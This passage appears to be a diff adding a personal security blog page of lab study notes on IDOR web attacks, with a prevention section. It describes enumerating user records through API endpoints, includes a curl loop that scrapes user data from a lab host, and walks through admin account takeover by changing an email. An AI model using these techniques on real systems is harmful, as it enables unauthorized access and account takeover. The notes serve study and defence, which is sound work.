+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">contract</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">CryptoJS</span>.<span style="color:#a6e22e">MD5</span>(<span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">uid</span>)).<span style="color:#a6e22e">toString</span>(),
+</span></span><span style="display:flex;"><span>        }, <span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;_self&#34;</span>);
+</span></span><span style="display:flex;"><span>    }</span></span></code></pre></div>
+    
+</div>
+</li>
+<li><!-- raw HTML omitted -->Function Breakdown<!-- raw HTML omitted -->:
+<ul>
+<li>Sends a <code>POST</code> request with a contract parameter.</li>
+<li><code>CryptoJS.MD5(btoa(uid)).toString()</code>
+<ul>
+<li>Calculate&rsquo;s the value, where <code>btoa(uid)</code> is the base64 encoded string of the uid argument.
+<ul>
+<li>The base64 part is in another function that we just &ldquo;know&rdquo; about.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><del>Example of how we would use this information to exploit IDOR</del>:
+<ol>
+<li>We capture a request where we download a file:
+<ul>
+<li>It contains the following value for the referenced download file: <code>contract=cdd96d3cc73d1dbdaffa03cc6cd7339b</code></li>
+</ul>
+</li>
+<li>We enumerate all JS functions on the page and find the one above.</li>
+<li>We check if encoding a value in base64 and then hashing that encoded text gives us the same value:
+<ul>
+<li><code>Command</code>: echo -n1 | base64 -w 0 | md5sum | tr -d &rsquo; -&rsquo;</li>
+<li><del>NOTE</del>:
+<ul>
+<li>We are using the <code>-n</code> flag with echo, and the <code>-w 0</code> flag with base64, to avoid adding newlines, in order to be able to calculate the md5 hash of the same value, without hashing newlines, as that would change the final md5 hash.</li>
+<li>We use <code>tr -d ' -'</code> to remove the trailing whitespace and hyphen.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Create a script to</li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="idor-in-insecure-apis">IDOR in Insecure APIs:</h3>
+<ul>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/registration-vulnerabilities#idor-on-api-parameters">https://book.hacktricks.xyz/pentesting-web/registration-vulnerabilities#idor-on-api-parameters</a></li>
+</ul>
+<h4 id="identifying-insecure-api-s">Identifying Insecure API&rsquo;s:</h4>
+<ol>
+<li>
+<p><strong>Trigger functions on the page and capture in Burp</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/web_attacks_idor_update_request.jpg">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Inspect requests for API calls</strong>:</p>
+<ul>
+<li>In the below example we can see that the page is sending a PUT request to the <code>/profile/api.php/profile/1</code> API endpoint</li>
+</ul>
+<p><del>Example</del>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;uid&#34;</span>: <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;uuid&#34;</span>: <span style="color:#e6db74">&#34;40f5888b67c748df7efba008e7c2f9d2&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;employee&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;full_name&#34;</span>: <span style="color:#e6db74">&#34;Amy Lindon&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;email&#34;</span>: <span style="color:#e6db74">&#34;a_lindon@employees.htb&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;about&#34;</span>: <span style="color:#e6db74">&#34;A Release is like a boat. 80% of the holes plugged is not good enough.&#34;</span>
+</span></span><span style="display:flex;"><span>    }</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>We can see there are a number of parameters we could manipulate here to see if we can access or alter other users.
+In theory we could attempt to do the following with these paramters:
+<ul>
+<li>Change our uid to another user&rsquo;s uid, to see if we can take over their accounts.</li>
+<li>Change another user&rsquo;s details, which may allow us to perform several web attacks</li>
+<li>Create new users with arbitrary details, or delete existing users</li>
+<li>Change our role to a more privileged role (e.g. admin) to be able to perform more actions</li>
+</ul>
+</li>
+<li>See <a href="#exploiting-insecure-api-s">Exploiting Insecure API&rsquo;s:</a> for the next steps:</li>
+</ul>
+</li>
+</ol>
+<h3 id="manipulating">Manipulating :</h3>
+<ul>
+<li>Some web applications developed in JavaScript frameworks may insecurely place all function calls on the front-end and use the appropriate ones when needed by the user interacting with them, based on their access level.
+<ul>
+<li>This is dangerous because if ALL function calls are placed in the front-end we can inspect them and test if they are vulnerable to IDOR. E.G. There could be Admin functions on the front end that we can manipulate.</li>
+</ul>
+</li>
+<li>We may be able to identify AJAX calls to specific end-points or APIs that contain direct object references. If we identify direct object references in the JavaScript code, we can test them for IDOR vulnerabilities.
+<ul>
+<li><del>Note</del>: I&rsquo;m not entirely sure how this works as of yet other than inspecting javascript code within the browser, but I get the principles of it.</li>
+</ul>
+</li>
+</ul>
+<h3 id="compare-user-roles-create-multiple-user-accounts-for-comparison">Compare User Roles/Create Multiple User Accounts for Comparison:</h3>
+<ul>
+<li>By creating multiple user accounts we can compare their HTTP requests and object references. This may allow us to understand how the URL paramtertts and unique identifigers are being calculated, we can then attempt to calculcate for other users based off of this.</li>
+<li><del>Example Scenario</del>: We have 2 user accounts.
+<ul>
+<li>
+<p>User 1 has the ability to check their salary. This is handled by the below API call.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;attributes&#34;</span> :
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;type&#34;</span> : <span style="color:#e6db74">&#34;salary&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;url&#34;</span> : <span style="color:#e6db74">&#34;/services/data/salaries/users/1&#34;</span>
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Id&#34;</span> : <span style="color:#e6db74">&#34;1&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Name&#34;</span> : <span style="color:#e6db74">&#34;User1&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        }</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p>User does not the ability to check their salary. However we can test if we can make this API call whilst logged in as user 2 and see if it is succesful.</p>
+<ul>
+<li>This may work in some cases as certain web applications may only need a valid logged in session to send the API call. The option may not be visible to user 2 however we can still attempt to send it.</li>
+<li>We can then also calculate other API parameters based of the information in this API call.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="4e02a6"><del>IDOR Attack</del>:</h2>
+<h3 id="exploiting-insecure-api-s">Exploiting Insecure API&rsquo;s:</h3>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>Exploiting IDOR Insecure Function Calls:</p>
+<ul>
+<li><del>Example</del> <strong>of enumerating/Exploiting IDOR Insecure Function Calls</strong>:
+<ul>
+<li>Obviously this will differ in the real world, but the below is how we could go about testing these API parameters.
+<ol>
+<li>
+<p><!-- raw HTML omitted -->Change the uid from 1 to 2 to see if we can get a valid respoinse and access another users information<!-- raw HTML omitted -->:</p>
+<ul>
+<li><figure><img src="/ox-hugo/web_attacks_idor_uid_mismatch.jpg">
+</figure>
+</li>
+<li>We can see that when we do this we get a UID mismatch error.</li>
+<li>The web application appears to be comparing the request&rsquo;s uid to the API endpoint (<code>/profile/api.php/profile/1</code>) which is preventing us from getting a valid reponse.</li>
+</ul>
+</li>
+<li>
+<p><!-- raw HTML omitted -->Change the API endpoint to match the UID<!-- raw HTML omitted -->:</p>
+<ul>
+<li><figure><img src="/ox-hugo/web_attacks_idor_uuid_mismatch.jpg">
+</figure>
+</li>
+<li>We alter the API endpoint to match the UID we changed (<code>/profile/api.php/profile/2</code>) but we now get a UUID mismatch error:</li>
+<li>The application seems to checking the UUID we send matches the UUID for the user we are trying to impersonate, as we are sending the UUID of our own users, Amy this will not match and causes this error.</li>
+</ul>
+</li>
+<li>
+<p><!-- raw HTML omitted -->Try and create a new user<!-- raw HTML omitted -->:</p>
+<ul>
+<li>As ourselves:
+<ul>
+<li><figure><img src="/ox-hugo/web_attacks_idor_create_new_user_1.jpg">
+</figure>
+</li>
+<li>This time we alter the API endpoint to <code>/50</code> the uid to <code>50</code> and change our GET request into a post request to see if we can add new users via this method, however we are told that &ldquo;Creating new employees is for admins only&rdquo;</li>
+</ul>
+</li>
+<li>As an admin/administrator:
+<ul>
+<li><figure><img src="/ox-hugo/web_attacks_idor_invalid_role.jpg">
+</figure>
+</li>
+<li>We change our role to admin/adminstrator to see if this grants us the relevant permissions but we can an &ldquo;Invalid role&rdquo; erorr &amp; our role does not update.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="information-disclosure-via-idor-vulnerbility">Information Disclosure Via IDOR vulnerbility:</h3>
+<ul>
+<li>
+<p><strong>API Example</strong></p>
+<ul>
+<li>Sometimes a request may be made like the following:
+<ul>
+<li>GET /profile/api.php/profile/1</li>
+<li>We may be able to increment the number at the end as a way to view other records held.</li>
+<li><del>API Example</del>:
+<ul>
+<li><code>/profile/api.php/profile/2</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Parameter Example</strong>:</p>
+<ul>
+<li>GET /profile/users.php?id=%4d%51%3d%3d</li>
+<li>This is just the number 1 encoded to base64 and then URL encoded so we can just incremement this value.</li>
+<li><del>URL Parameter Example</del>:
+<ul>
+<li>/profile/users.php?id=%4d%77%3d%3d</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Example of enumerating IDOR Information Dislosure Vulnerability Via API</strong>:</p>
+<ul>
+<li>We can see that by simply changing the API endpoint value (<code>/profile/api.php/profile/5</code>) we have been able to retrieve the information of another user easily in a simple GET request.</li>
+<li><figure><img src="/ox-hugo/2024-02-13_18-10.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="chaining-idor-vulnerabilities-for-further-exploitation">Chaining IDOR Vulnerabilities For Further Exploitation:</h3>
+<ul>
+<li>The below is used to illustrate what is possible, and is just an example, but it&rsquo;s this type of creative thinking that is required to push this further.</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p><del>Example 1</del>: Modifying Other Users&rsquo; Details:</p>
+<ol>
+<li><strong>Information Disclosure</strong>:
+<ul>
+<li>In this example we have managed to find an information disclosure vulnerability where by changing the API request value: e.g. <code>/profile/1</code> to <code>/profile/2</code> we can disclose other users details.</li>
+<li><figure><img src="/ox-hugo/web_attacks_idor_get_another_user.jpg">
+</figure>
+</li>
+</ul>
+</li>
+<li><strong>Modify the users details</strong>:
+<ul>
+<li>As we now have access to the users information we can use a <code>PUT</code> request to modify these to our liking.
+<ul>
+<li>Remember PUT is used for modifying existing entries/data</li>
+<li><figure><img src="/ox-hugo/web_attacks_idor_modify_another_user.jpg">
+</figure>
+</li>
+</ul>
+</li>
+<li>Successful Manipulation:
+<ul>
+<li><figure><img src="/ox-hugo/web_attacks_idor_new_another_user_details.jpg">
+</figure>
+</li>
+<li>This works as we have technically authenticated as the user using thei UID etc.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><del>Possible attack vectors</del>:
+<ul>
+<li>We could modify the users email address to one we control and then request a password reset causing account takeover.</li>
+<li>We could place an payload in the &ldquo;about&rdquo; field that would be triggered when the user visited that page.</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p><del>Example 2</del>: Elevating Our privileges to admin:</p>
+<ol>
+<li><strong>Information Disclosure</strong>:
+<ul>
+<li>In this example we have managed to find an information disclosure vulnerability where by changing the API request value: e.g. <code>/profile/1</code> to <code>/profile/2</code> we can disclose other users details.</li>
+<li><figure><img src="/ox-hugo/web_attacks_idor_get_another_user.jpg">
+</figure>
+</li>
+</ul>
+</li>
+<li><strong>I have then fuzzed this API parameter with a simple list in BURP</strong>:
+<ul>
+<li>Create range:  for i in {1..50}; do echo $i; done</li>
+</ul>
+</li>
+<li><strong>I then get a hit for a staff admin</strong>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-02-14-073945_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li><strong>Modify my users details so they are now a staff admin</strong>:
+<ol>
+<li>I then intercept all traffic whilst making a request to change my users details.</li>
+<li>I put the admins infomration I discovered in the previous step whilst setting the email to one I control.
+<ul>
+<li><figure><img src="/ox-hugo/2024-02-14-074548_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+<li><del>Profit</del>:
+<ul>
+<li>In this example I used the information disclosure bug to enumerate all users until I found an admin; Then since I had their UID, UUID and other information I used a PUT request to change their email to an address I controlled and I could initiate a password reset etc.</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<h3 id="idor-script-for-grabbing-information">IDOR Script for grabbing information:</h3>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>   <span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>0..100<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>     curl --compressed -s -k -X <span style="color:#e6db74">$&#39;GET&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>         <span style="color:#75715e"># change host</span>
+</span></span><span style="display:flex;"><span>       -H <span style="color:#e6db74">$&#39;Host: 83.136.251.235:31640&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>       -H <span style="color:#e6db74">$&#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>       -H <span style="color:#e6db74">$&#39;Accept: */*&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>       <span style="color:#75715e"># change</span>
+</span></span><span style="display:flex;"><span>       -H <span style="color:#e6db74">$&#39;Referer: http://83.136.251.235:31640/profile.php&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>       -H <span style="color:#e6db74">$&#39;Accept-Encoding: gzip, deflate, br&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>       -H <span style="color:#e6db74">$&#39;Accept-Language: en-US,en;q=0.9&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>       -H <span style="color:#e6db74">$&#39;Connection: keep-alive&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>       <span style="color:#75715e"># change</span>
+</span></span><span style="display:flex;"><span>       -b <span style="color:#e6db74">$&#39;PHPSESSID=babfihv163m10dkoe45um2u0u8; uid=74&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>       <span style="color:#75715e"># change</span>
+</span></span><span style="display:flex;"><span>       <span style="color:#e6db74">&#34;http://83.136.251.235:31640/api.php/user/</span><span style="color:#e6db74">${</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> &gt;&gt; <span style="color:#e6db74">&#34;response.txt&#34;</span>
+</span></span><span style="display:flex;"><span>       echo <span style="color:#e6db74">&#34;&#34;</span> &gt;&gt; <span style="color:#e6db74">&#34;response.txt&#34;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">done</span></span></span></code></pre></div>
+    
+</div>
+<h2 id="idor-prevention">IDOR Prevention:</h2>
+<ul>
+<li>
+<p><strong>Object-Level Access Control</strong>:</p>
+<ul>
+<li><!-- raw HTML omitted -->Access Control System<!-- raw HTML omitted -->: Fundamental for web application security, influencing design and structure.</li>
+<li><!-- raw HTML omitted -->Role-Based Access Control (RBAC)<!-- raw HTML omitted -->: Essential for managing user roles and permissions, crucial for preventing IDOR vulnerabilities.
+<ul>
+<li>Users assigned roles with specific privileges.</li>
+<li>Access to objects/resources granted based on user&rsquo;s role and privileges.</li>
+</ul>
+</li>
+<li><!-- raw HTML omitted -->Implementation of RBAC<!-- raw HTML omitted -->: Involves mapping roles to objects/resources; critical for secure access.
+<ul>
+<li>Example Code which would enable RBAC when accessing objects:
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20%20%20%20%20%20%20match%20/api/profile/%7buserId%7d%20%7b%0a%20%20%20%20%20%20%20%20allow%20read,%20write:%20if%20user.isAuth%20==%20true%0a%20%20%20%20%20%20%20%20&amp;&amp;%20%28user.uid%20==%20userId%20%7c%7c%20user.roles%20==%20%27admin%27%29;%0a%20%20%20%20%20%20%20%20%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>        <span style="color:#a6e22e">match</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">api</span><span style="color:#f92672">/</span><span style="color:#a6e22e">profile</span><span style="color:#f92672">/</span>{<span style="color:#a6e22e">userId</span>} {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">allow</span> <span style="color:#a6e22e">read</span>, <span style="color:#a6e22e">write</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">isAuth</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">uid</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">userId</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">roles</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;admin&#39;</span>);
+</span></span><span style="display:flex;"><span>        }</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>Demonstrates access control based on user authentication and role verification.</li>
+<li>Importance of server-side role mapping to avoid client-side manipulation.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Object Referencing</strong>:</p>
+<ul>
+<li><!-- raw HTML omitted -->Direct Object Referencing Risks<!-- raw HTML omitted -->: Can lead to IDOR vulnerabilities if access control is weak.</li>
+<li><!-- raw HTML omitted -->Use of Secure References<!-- raw HTML omitted -->: Recommended to use non-predictable references like UUIDs for object identification.
+<ul>
+<li>Example Code:
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20%20%20%20%20%20%20$uid%20=%20intval%28$_REQUEST[%27uid%27]%29;%0a%20%20%20%20%20%20%20%20$query%20=%20%22SELECT%20url%20FROM%20documents%20where%20uid=%22%20.%20$uid;%0a%20%20%20%20%20%20%20%20$result%20=%20mysqli_query%28$conn,%20$query%29;%0a%20%20%20%20%20%20%20%20$row%20=%20mysqli_fetch_array%28$result%29%29;%0a%20%20%20%20%20%20%20%20echo%20%22%3ca%20href=%27%22%20.%20$row[%27url%27]%20.%20%22%27%20target=%27_blank%27%3e%3c/a%3e%22;">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>        $uid <span style="color:#f92672">=</span> <span style="color:#a6e22e">intval</span>($_REQUEST[<span style="color:#e6db74">&#39;uid&#39;</span>]);
+</span></span><span style="display:flex;"><span>        $query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT url FROM documents where uid=&#34;</span> <span style="color:#f92672">.</span> $uid;
+</span></span><span style="display:flex;"><span>        $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysqli_query</span>($conn, $query);
+</span></span><span style="display:flex;"><span>        $row <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysqli_fetch_array</span>($result));
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;a href=&#39;&#34;</span> <span style="color:#f92672">.</span> $row[<span style="color:#e6db74">&#39;url&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&#39; target=&#39;_blank&#39;&gt;&lt;/a&gt;&#34;</span>;</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>Illustrates the use of secure references in database queries.</li>
+<li>Hash Generation and Storage: Should be performed server-side to maintain security.</li>
+<li>Challenges with UUIDs: While enhancing security, they can make detecting IDOR vulnerabilities more difficult.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>General Recommendations</strong>:</p>
+<ul>
+<li>Strong Access Control: The first line of defense against IDOR, ensuring only authorized access to resources.</li>
+<li>Secure Object Referencing: Complements access control by obscuring direct references to objects.</li>
+<li>Comprehensive Implementation: Both strong access control and secure object referencing are necessary for effective IDOR prevention.</li>
+</ul>
+</li>
+</ul>
+<h2 id="tools-used-for-the-attack">Tools Used for the attack:</h2>
+<ul>
+<li></li>
+<li></li>
+</ul>
+<h2 id="references">References:</h2>
+<ul>
+<li></li>
+<li></li>
+</ul>
+
+            
+        </div>
+    </article>
+
+        </main>
+
+        <footer class="footer">
+    <div class="footer-left">
+        <ul class="social">
+            
+                <li>All Rights Reserved ®.</li>
+            
+
+            
+                <li>Bloodstiller</li>
+            
+
+            
+                
+            
+                
+            
+                
+                    <li>
+                        
+                            <a href="https://github.com/bloodstiller" target="_blank">
+                                <i class="bi-github"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+        </ul>
+    </div>
+
+    <div class="footer-right">
+        <ul class="control status clearfix">
+            
+                <li>
+                    
+                        Word Count:
+                        3760
+                    
+                </li>
+            
+
+            
+            
+
+            
+                <li>en</li>
+            
+
+            
+                <li>
+                    <a href="https://gohugo.io" class="btn" target="_blank"
+                        >Hugo: 0.135.0</a
+                    >
+                </li>
+            
+
+            
+                <li>
+                    <a
+                        href="https://github.com/JingWangTW/dark-theme-editor"
+                        class="btn"
+                        target="_blank"
+                        >Theme: dark-theme-editor</a
+                    >
+                </li>
+            
+
+            
+                <li>
+                    
+                        Last modified: &nbsp;
+                        <time>
+                            Jan 01 0001 00:00:00
+                        </time>
+                    
+                </li>
+            
+
+            
+                <li title="">
+                    
+                </li>
+            
+        </ul>
+    </div>
+</footer>
+
+    </body>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
+            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
+            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
+            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
+            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />
+
+
+
+
+</html>
